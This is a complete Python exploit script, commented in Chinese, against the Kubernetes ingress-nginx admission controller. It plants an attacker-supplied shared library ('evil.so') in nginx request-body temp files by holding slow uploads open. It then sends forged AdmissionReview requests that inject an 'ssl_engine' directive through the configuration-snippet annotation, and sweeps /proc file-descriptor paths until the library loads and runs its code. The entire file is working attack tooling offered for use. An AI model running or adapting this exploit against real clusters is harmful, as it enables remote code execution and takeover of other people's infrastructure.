#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import json
import os
import socket
import ssl
import sys
import threading
import time
import uuid
ADM_IP = sys.argv[1] if len(sys.argv) > 1 else "10.42.254.132"
SO_PATH = sys.argv[2] if len(sys.argv) > 2 else "/tmp/cve/evil.so"
UP_HOST = sys.argv[3] if len(sys.argv) > 3 else os.environ.get("UP_HOST", "172.20.60.30")
UP_PORT = int(sys.argv[4] if len(sys.argv) > 4 else os.environ.get("UP_PORT", "80"))
ADM_PORT = int(os.environ.get("ADM_PORT", "8443"))
UP_PATH = os.environ.get("UPPATH", "/api/auth/login")
UP_HOSTHDR = os.environ.get("UPHOSTHDR", UP_HOST)
N_UPLOAD = int(os.environ.get("NUPLOAD", "10"))
PID_MIN = int(os.environ.get("PIDMIN", "16"))
PID_MAX = int(os.environ.get("PIDMAX", "140"))
FD_MIN = int(os.environ.get("FDMIN", "3"))
FD_MAX = int(os.environ.get("FDMAX", "40"))
WORKERS = int(os.environ.get("WORKERS", "4"))
HOLD = int(os.environ.get("HOLD", "600"))
TRICKLE = float(os.environ.get("TRICKLE", "8"))
STOP = threading.Event()
USTOP = threading.Event()
lock = threading.Lock()
stats = {"probe": 0, "hit": 0}
def log(msg):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), msg), flush=True)
# --------------------------------------------------------------------------
# 1) 把自有 .so 顶进 controller 的 client_body 临时文件，并保持 fd 打开
# --------------------------------------------------------------------------
def upload_worker(idx):
    try:
        so = open(SO_PATH, "rb").read()
    except Exception as e:
        log("read so failed: %s" % e)
        return
    body = so + b"\x00" * 8192          # 超过 client_body_buffer_size(1k) 才会落盘
    clen = len(body) + 4000000          # 故意比实际发送的多，让请求永远收不完
    hdr = (
        "POST %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: Mozilla/5.0\r\n"
        "Content-Type: application/octet-stream\r\n"
        "Content-Length: %d\r\n"
        "Connection: keep-alive\r\n\r\n" % (UP_PATH, UP_HOSTHDR, clen)
    ).encode()
    try:
        s = socket.create_connection((UP_HOST, UP_PORT), timeout=10)
        s.sendall(hdr + body)
    except Exception as e:
        log("upload#%d failed: %s" % (idx, e))
        return
    log("upload#%d sent %d bytes, holding connection" % (idx, len(body)))
    end = time.time() + HOLD
    while not USTOP.is_set() and time.time() < end:
        try:
            s.sendall(b"\x00")          # 心跳字节，避开 client_body_timeout
        except OSError:
            return
        USTOP.wait(TRICKLE)
    try:
        s.close()
    except OSError:
        pass
# --------------------------------------------------------------------------
# 2) 构造 AdmissionReview，把 ssl_engine 注入 configuration-snippet
# --------------------------------------------------------------------------
def build_review(snippet):
    name = "pwn-" + uuid.uuid4().hex[:8]
    return json.dumps({
        "apiVersion": "admission.k8s.io/v1",
        "kind": "AdmissionReview",
        "request": {
            "uid": str(uuid.uuid4()),
            "kind": {"group": "networking.k8s.io", "version": "v1", "kind": "Ingress"},
            "resource": {"group": "networking.k8s.io", "version": "v1", "resource": "ingresses"},
            "requestKind": {"group": "networking.k8s.io", "version": "v1", "kind": "Ingress"},
            "requestResource": {"group": "networking.k8s.io", "version": "v1", "resource": "ingresses"},
            "name": name,
            "namespace": "default",
            "operation": "CREATE",
            "userInfo": {"username": "admin", "uid": "1"},
            "object": {
                "apiVersion": "networking.k8s.io/v1",
                "kind": "Ingress",
                "metadata": {
                    "name": name,
                    "namespace": "default",
                    "annotations": {
                        "nginx.ingress.kubernetes.io/configuration-snippet":
                            "}}} ssl_engine %s; http { server { location / {" % snippet,
                    },
                },
                "spec": {
                    "ingressClassName": "nginx",
                    "rules": [{
                        "host": "evildomain.com",
                        "http": {"paths": [{
                            "path": "/",
                            "pathType": "Prefix",
                            "backend": {"service": {"name": "none", "port": {"number": 80}}},
                        }]}
                    }],
                },
            },
        },
    }).encode()
CTX = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE
def adm_probe(path, timeout=6.0):
    body = build_review(path)
    req = (
        "POST /networking/v1/ingresses HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: %d\r\n"
        "Connection: close\r\n\r\n" % (ADM_IP, len(body))
    ).encode()
    try:
        raw = socket.create_connection((ADM_IP, ADM_PORT), timeout=timeout)
        s = CTX.wrap_socket(raw, server_hostname=ADM_IP)
        s.settimeout(timeout)
        s.sendall(req + body)
        data = b""
        while True:
            chunk = s.recv(65536)
            if not chunk:
                break
            data += chunk
        s.close()
    except Exception as e:
        return 0, str(e)
    try:
        status = int(data.split(b" ")[1])
    except Exception:
        status = 0
    return status, data.decode("utf-8", "replace")
def classify(status, text):
    if "No such file or directory" in text:
        return "NOFILE"
    if "could not load the shared library" in text:
        return "BADELF"
    if "no such engine:id=" in text:
        return "LOADED"            # dlopen 成功 -> constructor 已执行
    if '"allowed": true' in text or '"allowed":true' in text:
        return "ALLOWED"
    if status == 0 and ("timed out" in text or "timeout" in text.lower()):
        return "HANG"              # 读到了 controller 的 exec 管道，dlopen 会阻塞
    return "OTHER"
# --------------------------------------------------------------------------
# 3) 盲扫 /proc/<pid>/fd/<fd>
# --------------------------------------------------------------------------
def sweep():
    pairs = [(pid, fd) for pid in range(PID_MIN, PID_MAX + 1)
             for fd in range(FD_MIN, FD_MAX + 1)]
    log("sweep %d combinations (pid %d-%d, fd %d-%d) with %d workers"
        % (len(pairs), PID_MIN, PID_MAX, FD_MIN, FD_MAX, WORKERS))
    q = list(pairs)
    qlock = threading.Lock()
    hits = []
    bad = set()
    def run():
        while not STOP.is_set():
            with qlock:
                if not q:
                    return
                pid, fd = q.pop(0)
            if pid in bad:
                continue
            status, text = adm_probe("/proc/%d/fd/%d" % (pid, fd))
            kind = classify(status, text)
            with lock:
                stats["probe"] += 1
                n = stats["probe"]
            if kind == "HANG":
                with lock:
                    bad.add(pid)
                log("pid=%d fd=%d -> HANG（读到 controller 的 exec 管道），跳过 pid %d" % (pid, fd, pid))
                continue
            if kind == "LOADED":
                with lock:
                    stats["hit"] += 1
                    hits.append((pid, fd))
                log("*** HIT *** /proc/%d/fd/%d -> dlopen 成功，constructor 已执行" % (pid, fd))
                STOP.set()
                return
            if n % 200 == 0:
                log("progress %d probes" % n)
    ts = [threading.Thread(target=run, daemon=True) for _ in range(WORKERS)]
    [t.start() for t in ts]
    [t.join() for t in ts]
    log("sweep done: %d probes, hits=%s" % (stats["probe"], hits))
    return hits
def main():
    if os.environ.get("PROBE_PATH"):
        status, text = adm_probe(os.environ["PROBE_PATH"])
        log("probe %s -> status=%s" % (os.environ["PROBE_PATH"], status))
        log("body: %s" % text[-1200:])
        return
    log("admission %s:%d, upload %s:%d%s, so=%s"
        % (ADM_IP, ADM_PORT, UP_HOST, UP_PORT, UP_PATH, SO_PATH))
    for i in range(N_UPLOAD):
        threading.Thread(target=upload_worker, args=(i,), daemon=True).start()
        time.sleep(0.05)
    time.sleep(1.5)
    hits = sweep()
    log("holding %d upload connections for %ds (hits=%s)" % (N_UPLOAD, HOLD, hits))
    try:
        while not STOP.is_set() or True:
            time.sleep(10)
    except KeyboardInterrupt:
        STOP.set()
if __name__ == "__main__":
    main()
